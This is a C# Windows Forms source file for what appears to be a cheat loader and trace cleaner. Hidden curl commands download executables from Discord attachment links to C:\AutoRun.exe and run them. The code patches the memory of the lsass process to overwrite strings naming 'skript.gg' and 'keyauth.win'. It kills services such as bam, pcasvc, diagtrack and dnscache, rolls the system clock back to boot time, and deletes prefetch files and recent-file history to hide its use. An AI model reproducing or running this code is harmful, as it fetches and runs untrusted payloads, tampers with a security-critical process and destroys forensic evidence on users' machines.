using Binarysharp.MemoryManagement;
using Binarysharp.MemoryManagement.Memory;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Binarysharp.MemoryManagement.Native;
using DrawingPoint = System.Drawing.Point;
using System.Diagnostics.Eventing.Reader;
using System.IO;


namespace never.Forms
{
    public partial class Main : Form
    {
        private DrawingPoint targetLocation;
        private DrawingPoint lastCursor;
        private DrawingPoint lastForm;
        private const int AnimationDuration = 500; // Duração da animação em milissegundos
        private DateTime animationStartTime;
        private Timer animationTimer;
        #region Variables
        private bool isDragging = false;
        #endregion
        public Main()
        {
            InitializeComponent();
            AddDragEventsToControls(this);
            targetLocation = Slide1.Location;
            AnimationTimer = new Timer();
            AnimationTimer.Interval = 16; // Cerca de 60 quadros por segundo
            AnimationTimer.Tick += AnimationTimer_Tick;
        }

        private MemorySharp MemLib;

        private void AddDragEventsToControls(Control container)
        {
            // Percorre todos os controles dentro do container (formulário ou painel)
            foreach (Control control in container.Controls)
            {
                // Adiciona os eventos para os controles filhos
                control.MouseDown += Control_MouseDown;
                control.MouseMove += Control_MouseMove;
                control.MouseUp += Control_MouseUp;

                // Se o controle é um container (por exemplo, um painel ou grupo), chama recursivamente para adicionar aos seus controles filhos
                if (control.Controls.Count > 0)
                {
                    AddDragEventsToControls(control);
                }
            }
        }

        private void AttachToProcess()
        {
            var process = Process.GetProcessesByName("targetProcess").FirstOrDefault();
            if (process != null)
            {
                MemLib = new MemorySharp(process);
                Console.WriteLine("Attached to process: " + process.ProcessName);
            }
            else
            {
                Console.WriteLine("Process not found!");
            }
        }


        private void Control_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                lastCursor = Cursor.Position;
                lastForm = this.Location;
            }
        }

        private void Control_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                int xDiff = Cursor.Position.X - lastCursor.X;
                int yDiff = Cursor.Position.Y - lastCursor.Y;
                this.Location = new System.Drawing.Point(lastForm.X + xDiff, lastForm.Y + yDiff);

            }
        }

        private void Control_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
            }
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Application.Exit();
            Application.ExitThread();
            Environment.Exit(0);
        }
        private int Interpolate(int start, int end, double progress)
        {
            return (int)(start + (end - start) * progress);
        }
        private void AnimationTimer_Tick(object sender, EventArgs e)
        {
            TimeSpan elapsedTime = DateTime.Now - animationStartTime;
            if (elapsedTime.TotalMilliseconds >= AnimationDuration)
            {
                Slide1.Location = targetLocation;
                AnimationTimer.Stop();
            }
            else
            {
                double progress = elapsedTime.TotalMilliseconds / AnimationDuration;
                int newX = Interpolate(Slide1.Location.X, targetLocation.X, progress);
                int newY = Interpolate(Slide1.Location.Y, targetLocation.Y, progress);
                Slide1.Location = new System.Drawing.Point(newX, newY);

            }
        }

        private void Btn1_Click(object sender, EventArgs e)
        {
            targetLocation = new System.Drawing.Point(87, 72);
            animationStartTime = DateTime.Now;
            skriptp.BringToFront();
        }

        private void Btn2_Click(object sender, EventArgs e)
        {
            targetLocation = new System.Drawing.Point(87, 110);
            animationStartTime = DateTime.Now;
            tzxp.BringToFront();
        }

        [DllImport("KERNEL32.DLL")]
        public static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint processid);
        [DllImport("KERNEL32.DLL")]
        public static extern int Process32First(IntPtr handle, ref ProcessEntry32 pe);
        [DllImport("KERNEL32.DLL")]
        public static extern int Process32Next(IntPtr handle, ref ProcessEntry32 pe);





















        public string GetProcID(int index)
        {
            string result = "";
            checked
            {
                if (index == 1 || index == 0)
                {
                    IntPtr intPtr = IntPtr.Zero;
                    uint num = 0U;
                    IntPtr intPtr2 = CreateToolhelp32Snapshot(2U, 0U);
                    if ((int)intPtr2 > 0)
                    {
                        ProcessEntry32 processEntry = default(ProcessEntry32);
                        processEntry.dwSize = (uint)Marshal.SizeOf<ProcessEntry32>(processEntry);
                        for (int num2 = Process32First(intPtr2, ref processEntry); num2 == 1; num2 = Process32Next(intPtr2, ref processEntry))
                        {
                            IntPtr intPtr3 = Marshal.AllocHGlobal((int)processEntry.dwSize);
                            Marshal.StructureToPtr<ProcessEntry32>(processEntry, intPtr3, true);
                            object obj = Marshal.PtrToStructure(intPtr3, typeof(ProcessEntry32));
                            ProcessEntry32 processEntry2 = (obj != null) ? ((ProcessEntry32)obj) : default(ProcessEntry32);
                            Marshal.FreeHGlobal(intPtr3);

                            if (processEntry2.szExeFile.Contains("lsass.exe") && processEntry2.cntThreads > num)
                            {
                                num = processEntry2.cntThreads;
                                intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
                            }
                            if (processEntry2.szExeFile.Contains("lsass") && processEntry2.cntThreads > num)
                            {
                                num = processEntry2.cntThreads;
                                intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
                            }

                            if (processEntry2.szExeFile.Contains("lsass.exe") && processEntry2.cntThreads > num)
                            {
                                num = processEntry2.cntThreads;
                                intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
                            }

                            if (processEntry2.szExeFile.Contains("lsass.exe") && processEntry2.cntThreads > num)
                            {
                                num = processEntry2.cntThreads;
                                intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
                            }

                            if (processEntry2.szExeFile.Contains("lsass.exe") && processEntry2.cntThreads > num)
                            {
                                num = processEntry2.cntThreads;
                                intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
                            }

                            if (processEntry2.szExeFile.Contains("lsass.exe") && processEntry2.cntThreads > num)
                            {
                                num = processEntry2.cntThreads;
                                intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
                            }

                            if (processEntry2.szExeFile.Contains("lsass") && processEntry2.cntThreads > num)
                            {
                                num = processEntry2.cntThreads;
                                intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
                            }
                        }
                    }
                    result = Convert.ToString(intPtr);
                    PID.Text = Convert.ToString(intPtr);
                }
                return result;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtectEx(
    IntPtr hProcess,
    IntPtr lpAddress,
    int dwSize,
    uint flNewProtect,
    out uint lpflOldProtect
);

        public async Task<IEnumerable<long>> AoBScan(long start, long end, byte[] pattern)
        {
            List<long> results = new List<long>();

            for (long address = start; address < end; address += 0x1000) // Scanning memory in pages
            {
                // Read memory and ensure it's a single byte array
                byte[] memory = MemLib.Read<byte>(new IntPtr(address), pattern.Length);

                if (memory != null && memory.Length == pattern.Length && memory.SequenceEqual(pattern))
                {
                    results.Add(address);
                }
            }
            return results;
        }
        public static byte[] StringToByteArray(string hex)
        {
            return hex.Split(' ') // Split by spaces
                      .Select(b => Convert.ToByte(b, 16)) // Convert hex string to byte array
                      .ToArray();
        }
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        public void ChangeMemoryProtection(IntPtr address, int size)
        {
            uint oldProtection;
            VirtualProtectEx(MemLib.Handle.DangerousGetHandle(), address, size, PAGE_EXECUTE_READWRITE, out oldProtection);

        }



        public async void Rep(string original, string replace)
        {
            try
            {
                int processId = Convert.ToInt32(PID.Text);
                var process = Process.GetProcessById(processId);
                if (process != null)
                {
                    MemLib = new MemorySharp(process);
                    Console.WriteLine("Attached to process: " + process.ProcessName);
                }
                else
                {
                    Console.WriteLine("Process not found!");
                }

                // Perform AoB Scan
                byte[] pattern = StringToByteArray(original);
                IEnumerable<long> scanmem = await AoBScan(0x0000000000000000, 0x00007fffffffffff, pattern);
                long FirstScan = scanmem.FirstOrDefault();
                if (FirstScan == 0)
                {
                    Console.WriteLine("No results found!");
                }

                else
                {

                }
                foreach (long num in scanmem)
                {
                    IntPtr address = new IntPtr(num); // Convert num to IntPtr

                    // Change memory protection
                    MemoryProtection oldProtection;
                   ChangeMemoryProtection(new IntPtr(0x123456), 4); // Change protection for 4 bytes at address 0x123456


                    // Write bytes to memory
                    this.MemLib.Write(address, replace, false);


                }
                if (FirstScan == 0)
                {

                }
                else
                {
                    scanmem = (IEnumerable<long>)null;
                    Console.Beep(500, 300);
                }
            }
            catch
            {
            }
        }

        public struct ProcessEntry32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }




        private void servicestopped()
        {
            string[] svcs = { "pcasvc", "bam", "diagtrack", "dps" };
            foreach (ServiceController sc in ServiceController.GetServices())
            {
                foreach (string serviceName in svcs)
                {
                    if (sc.ServiceName.ToLower() == serviceName)
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "TASKKILL",
                            Arguments = $"/F /FI \"SERVICES eq {sc.ServiceName}\"",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        }).WaitForExit();
                    }
                }
            }
        }

        private async void lsass()
        {

            GetProcID(1);
            Rep("73 6b 72 69 70 74 2e 67 67", "63 68 72 6f 6d 65 2e 65 78 65");//skript 
            await Task.Delay(1000);
            Rep("00 2e 00 73 00 6b 00 72 00 69 00 70 00 74 00 2e 00 67 00 67", "63 68 72 6f 6d 65 2e 65 78 65");//skript 
            await Task.Delay(1000);
            Rep("73 00 6b 00 72 00 69 00 70 00 74 00 2e 00 67 00 67 00", "63 68 72 6f 6d 65 2e 65 78 65");//skript 
            await Task.Delay(1000);
            Rep("70 00 74 00 2e 67 67", "63 68 72 6f 6d 65 2e 65 78 65");  //skript 
            await Task.Delay(1000);
            Rep("70 00 74 00 2e 00 67 00 67 00", "63 68 72 6f 6d 65 2e 65 78 65"); //skript 
            await Task.Delay(1000);
            Rep("6b 00 65 00 79 00 61 00 75 00 74 00 68 00 2e 00 77 00 69 00 6e 00", "63 68 72 6f 6d 65 2e 65 78 65"); //keyauth
            await Task.Delay(1000);
            Rep("6b 00 65 00 79 00 61 00 75 00 74 00 68 00 2e 00 77 00 69 00 6e 00", "63 68 72 6f 6d 65 2e 65 78 65"); //keyauth
            await Task.Delay(1000);
            Rep("6b 65 79 61 75 74 68 2e 77 69 6e", "63 68 72 6f 6d 65 2e 65 78 65"); //keyauth
            await Task.Delay(1000);
            Rep("0d 2a 2e 6b 65 79 61 75 74 68 2e 77 69 6e", "63 68 72 6f 6d 65 2e 65 78 65"); //keyauth
            await Task.Delay(1000);
            Rep("6b 65 79 61 75 74 68 2e 77 69 6e", "63 68 72 6f 6d 65 2e 65 78 65"); //keyauth



        }


        public static void cmd(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            process.StandardInput.WriteLine(command);
            process.Close();
        }

        public static string timer()
        {
            DateTime boottime;
            SelectQuery query = new SelectQuery(@"SELECT LastBootUpTime FROM Win32_OperatingSystem WHERE Primary='true'");

            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject mo in searcher.Get())
            {
                boottime = ManagementDateTimeConverter.ToDateTime(mo.Properties["LastBootUpTime"].Value.ToString());

                return boottime.ToLongTimeString();

            }
            return null;
        }

        private async void buttonanimated1_Click(object sender, EventArgs e)
        {
            string url = "https://cdn.discordapp.com/attachments/1344893646947876874/1345127930401128490/resourceoptimizer.exe?ex=67c36b81&is=67c21a01&hm=531c483bed0c7a1ba3521ff47227b129d16ae09b712f0072e02c7b24e57b97fd&";
            string outputPath = @"C:\AutoRun.exe"; // Change the path here

            // Check if the AutoRun.exe file already exists
            if (!System.IO.File.Exists(outputPath))
            {
                // File doesn't exist, so download it
                Process downloadProcess = Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe", // Use cmd.exe to run the curl command
                    Arguments = $"/C curl -s \"{url}\" -o \"{outputPath}\" >nul", // Download and save as AutoRun.exe
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                // Wait for the download process to complete
                downloadProcess.WaitForExit();

                // After the process completes, check if the AutoRun.exe file exists
                if (System.IO.File.Exists(outputPath))
                {
                    MessageBox.Show("Download successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show("Download failed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                // File already exists, no download needed
                MessageBox.Show("File already exists. No download needed.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void buttonanimated2_Click(object sender, EventArgs e)
        {
            cmd("start C:\\AutoRun.exe");
        }
        static bool IsSignedByMicrosoft(string filePath)
        {
            try
            {
                X509Certificate cert = X509Certificate.CreateFromSignedFile(filePath);
                X509Certificate2 cert2 = new X509Certificate2(cert);
                return cert2.Subject.IndexOf("Microsoft", StringComparison.OrdinalIgnoreCase) >= 0;

            }
            catch
            {
                return false; // If there's no valid signature, assume it's not a system file
            }
        }
        private async void buttonanimated3_Click(object sender, EventArgs e)
        {
            try
            {
                // Call the lsass method (assuming it does some necessary work)
                lsass();

                void DeleteFileIfExists(string filePath)
                {
                    if (File.Exists(filePath))
                    {
                        File.Delete(filePath);
                    }
                }

                DeleteFileIfExists(@"C:\nEMZ79aO");
                string directory = @"C:\Windows\SysWOW64";
                DeleteFileIfExists(@"C:\AutoRun.exe");
                DeleteFileIfExists(@"C:\AutoRun.dll");

                // The rest of your existing code...
                Process process = new Process();
                string[] processes = new string[] { "pcasvc", "bam", "WSearch", "dnscache", "diagtrack", "CDPUser Svc_17a41d", "DPS", "DPS" };

                string BootStart = timer();
                string NowTime = DateTime.Now.ToString("HH:mm:ss");

                cmd("time " + BootStart);

                process.StartInfo.FileName = "taskkill.exe";
                process.StartInfo.Arguments = "/f /im explorer.exe";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                process.WaitForExit();
                await Task.Delay(2000);

                process.StartInfo.FileName = "taskkill.exe";
                process.StartInfo.Arguments = "/F /FI \"SERVICES eq dnscache\"";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                process.WaitForExit();
                await Task.Delay(2000);

                lsass();

                new Process
                {
                    StartInfo =
            {
                FileName = @"C:\Windows\explorer.exe",
                Arguments = "",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
                }.Start();

                foreach (var processName in processes)
                {
                    cmd("sc stop " + processName);
                    await Task.Delay(1200);
                    cmd("sc start " + processName);
                }
                cmd("time " + NowTime);

                // Additional cleanup commands...
                cmd("del /f /q /s C:\\Windows\\AutoRun.exe");
                cmd("del /f /q /s C:\\Windows\\AutoRun.dll");
                cmd("del /f /q /s C:\\Users\\%username%\\Recent");
                cmd("del /f /q /s C:\\Windows\\smartscreen.exe*");
                cmd("del /f /q /s C:\\Windows\\System32\\Curl.exe*r");
                cmd("del /f /q /s C:\\Windows\\prefetch\\TASKKILL.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\REG.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\REGEDIT.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\DISKPART.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\CURL.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\SC.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\AUTORUN.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\GOOGLECHROME.EXE*");
                Console.Beep(300, 500);
                Application.Exit();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
        }

        private async void buttonanimated4_Click(object sender, EventArgs e)
        {
            try
            {
                // Call the lsass method (assuming it does some necessary work)
                lsass();

                // Delete the specified file
                void DeleteFileIfExists(string filePath)
                {
                    if (File.Exists(filePath))
                    {
                        File.Delete(filePath);
                    }
                }

                DeleteFileIfExists(@"C:\nEMZ79aO");
                DeleteFileIfExists(@"C:\AutoRun.exe");
                DeleteFileIfExists(@"C:\AutoRun.dll");

                // The rest of your existing code...
                Process process = new Process();
                string[] processes = new string[] { "pcasvc", "bam", "WSearch", "dnscache", "diagtrack", "CDPUser Svc_17a41d", "DPS", "DPS" };

                string BootStart = timer();
                string NowTime = DateTime.Now.ToString("HH:mm:ss");

                cmd("time " + BootStart);

                process.StartInfo.FileName = "taskkill.exe";
                process.StartInfo.Arguments = "/f /im explorer.exe";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                process.WaitForExit();
                await Task.Delay(2000);

                process.StartInfo.FileName = "taskkill.exe";
                process.StartInfo.Arguments = "/F /FI \"SERVICES eq dnscache\"";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                process.WaitForExit();
                await Task.Delay(2000);

                lsass();

                new Process
                {
                    StartInfo =
            {
                FileName = @"C:\Windows\explorer.exe",
                Arguments = "",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
                }.Start();

                foreach (var processName in processes)
                {
                    cmd("sc stop " + processName);
                    await Task.Delay(1200);
                    cmd("sc start " + processName);
                }
                cmd("time " + NowTime);

                // Additional cleanup commands...
                cmd("del /f /q /s C:\\Windows\\AutoRun.exe");
                cmd("del /f /q /s C:\\Windows\\AutoRun.dll");
                cmd("del /f /q /s C:\\Users\\%username%\\Recent");
                cmd("del /f /q /s C:\\Windows\\smartscreen.exe*");
                cmd("del /f /q /s C:\\Windows\\System32\\Curl.exe*r");
                cmd("del /f /q /s C:\\Windows\\prefetch\\TASKKILL.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\REG.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\REGEDIT.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\DISKPART.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\CURL.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\SC.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\AUTORUN.EXE*");
                cmd("del /f /q /s C:\\Windows\\prefetch\\GOOGLECHROME.EXE*");
                Console.Beep(300, 500);
                Application.Exit();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
        }

        private async void buttonanimated6_Click(object sender, EventArgs e)
        {
            cmd("curl -s https://cdn.discordapp.com/attachments/1068700281090625647/1143753293307334696/launcher.exe -o C:\\RunAuto.exe >nul");
            await Task.Delay(2000);
        }

        private void buttonanimated5_Click(object sender, EventArgs e)
        {
            cmd("start C:\\AutoRun.exe");
        }

        
    }
}
